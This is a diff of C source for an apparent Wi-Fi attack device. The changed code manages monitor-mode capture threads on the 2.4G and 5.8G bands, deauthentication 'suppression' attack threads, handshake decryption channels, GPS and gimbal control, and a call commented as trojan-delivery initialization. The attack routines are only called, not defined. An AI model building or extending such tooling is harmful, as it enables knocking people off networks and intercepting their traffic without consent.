@@ -124,6 +124,7 @@ void publish_routine(void)
             		update_status("staAttach", "status-succ", NULL);
 					WifiAccess.mode=ACCESS_MODE_AP_SUCC;
 					g_acesstimeout=0;
+					stop_sta_inter();//停止攻击
             	}
             	else{
             		if(!StatusQueryEvtOn){
@@ -193,8 +194,8 @@ void atk_task(void)
 				else {
 					pthread_create(&pth1, NULL, do_deauth_atk, NULL);//开启持续压制线程
 				}
-				printf("%s thread is over\n",__func__);
 				pthread_join(pth1,NULL);
+				printf("%s thread is over\n",__func__);
 		}
 		else{
 			usleep(1000);
@@ -209,7 +210,7 @@ void atk_task(void)
 void wspy_task(void)
 {
 	pthread_t pth1,pth2,pth3,pth4,pth5,pth6,pth7;
-	uint8_t ucchl,ucch1=0xff,ucch2=0xff;
+	uint8_t ucchl,ucch1=0xff,ucch2=0xff,chl1scan=0;//chlcan 代表2.4G已经开启扫描线程，不需要5.8G再开
 	int pthflg[2]={0xff,0xff};
 
 
@@ -222,6 +223,8 @@ void wspy_task(void)
 #endif
     for (;;) {
         if (PcapOn[IEEE80211_2G4] == true||PcapOn[IEEE80211_5G8] == true) {
+        	ucchl=(PcapOn[IEEE80211_2G4]|(PcapOn[IEEE80211_5G8]<<1));
+        	chl1scan = false;
         	printf("%s %d start caputre %d %d\n",__func__,__LINE__,PcapOn[IEEE80211_2G4] ,PcapOn[IEEE80211_5G8] );
             if(PcapOn[IEEE80211_2G4] == true){//开启2.4G网卡抓包线程
             	strobe_wifi_monitor(0,1);
@@ -229,13 +232,14 @@ void wspy_task(void)
             	ucch1 = IEEE80211_2G4;
             	pthread_create(&pth1, NULL, (void *)capture_loop, (void *)&ucch1);
             	if(DecryptOn == false){
-            		pthread_create(&pth3, NULL, (void *)wifi_scan_policy, (void *)&ucch1);//开启扫描策略线程
+            		pthread_create(&pth3, NULL, (void *)wifi_scan_policy, (void *)&ucchl);//开启扫描策略线程
             		pthread_create(&pth6, NULL, (void *)deauth_process, (void *)&ucch1);
             		pthflg[IEEE80211_2G4] = 0x1;
+            		chl1scan = true;
             	}
-//            	else{
-//            		wifi_decrypt_setchl(ucch1);//设置握手包的信道
-//            	}
+            	else{
+            		wifi_decrypt_setchl(ucch1);//设置握手包的信道
+            	}
 
             }
             if(PcapOn[IEEE80211_5G8] == true){//开启5.8G网卡抓包线程
@@ -244,13 +248,15 @@ void wspy_task(void)
             	ucch2 = IEEE80211_5G8;
             	pthread_create(&pth4,  NULL, (void *)capture_loop, (void *)&ucch2);
             	if(DecryptOn == false){
-            		pthread_create(&pth5, NULL, (void *)wifi_scan_policy, (void *)&ucch2);//开启扫描策略线程
+            		if(chl1scan == false){
+						pthread_create(&pth3, NULL, (void *)wifi_scan_policy, (void *)&ucchl);//开启扫描策略线程
+					}
             		pthread_create(&pth7, NULL, (void *)deauth_process, (void *)&ucch2);
             		pthflg[IEEE80211_5G8] = 0x1;
             	}
-//            	else{
-//            		wifi_decrypt_setchl(ucch2);
-//            	}
+            	else{
+            		wifi_decrypt_setchl(ucch2);
+            	}
 
             }
 
@@ -266,9 +272,12 @@ void wspy_task(void)
             pthread_cancel(pth4);
             pthread_cancel(pth5);
 #else
+            printf("wait fot pthread over\n");
             if(ucch1== IEEE80211_2G4){
-            	//pthread_cancel(pth1);
+            	pthread_cancel(pth1);
+                printf("wait fot pthread1 over\n");
 			    pthread_join(pth1,NULL);
+			    printf("wait fot pthread2 over\n");
 			    destroy_wlan_list(IEEE80211_2G4);
 
 				if(pthflg[IEEE80211_2G4] == 0x1){
@@ -281,13 +290,15 @@ void wspy_task(void)
             printf("1111\n");
             if(ucch2 ==IEEE80211_5G8){
 			    printf("2222\n");
-            	//pthread_cancel(pth4);
-            	 printf("666\n");
+            	pthread_cancel(pth4);
+            	printf("666\n");
 				pthread_join(pth4,NULL);
 			    destroy_wlan_list(IEEE80211_5G8);
 				if(pthflg[IEEE80211_5G8] == 0x1){
-					 printf("333\n");
-					pthread_join(pth5,NULL);
+					printf("333\n");
+					if(chl1scan == false){
+						pthread_join(pth3,NULL);
+					}
 					printf("444\n");
 					pthread_join(pth7,NULL);
 				}
@@ -319,8 +330,6 @@ void gps_task(void)
     int port;
     size_t rxlen;
     char rxbuffer[1024];
-	char clongitude[64];
-	char claitude[64];
 
 	if (UserCfgJson.gps_disable == 1) {
 		printf("disabled gps service\n");
@@ -333,8 +342,8 @@ void gps_task(void)
         perror("can not open the port\n");
         return;
     }
-    wspy_gps.longtitude=atof(clongitude);
-    wspy_gps.latitude=atof(claitude);
+    wspy_gps.longtitude=UserCfgJson.longitude;
+    wspy_gps.latitude=UserCfgJson.latitude;
     for (;;) {
         rxlen = serial_readline(port, rxbuffer, sizeof(rxbuffer), 1000);
         if (rxlen > 0) {
@@ -362,6 +371,9 @@ int main(int argc, char * argv[])
     pthread_create(&id6, NULL, (void *)gimbal_thread, NULL);
     sleep(1);
     gimbal_init_set();
+#else
+    gimbal_set_angle(0,1);
+    gimbal_set_angle(0,36);
 #endif
     read_user_config();
     mmget_init();//木马下发初始化
@@ -371,7 +383,8 @@ int main(int argc, char * argv[])
 
 	init_status();//初始化程序状态
     pthread_mutex_init(&g_tscanpolicy_mutex,NULL);//初始化扫描策略线程锁
-    pthread_mutex_init(&g_tchl_mutex,NULL);//初始化信道获取线程锁
+    pthread_mutex_init(&g_tchl_mutex[0],NULL);//初始化信道获取线程锁
+    pthread_mutex_init(&g_tchl_mutex[1],NULL);//初始化信道获取线程锁
     pthread_mutex_init(&gps_staus_mutex,NULL);//初始化GPS状态互斥锁
  //   pthread_mutex_init(&g_wlanlist_mutex,NULL);//
 	pthread_create(&id1, NULL, (void *)mqtt_client, NULL);//启动mqtt线程连接服务器，订阅消息
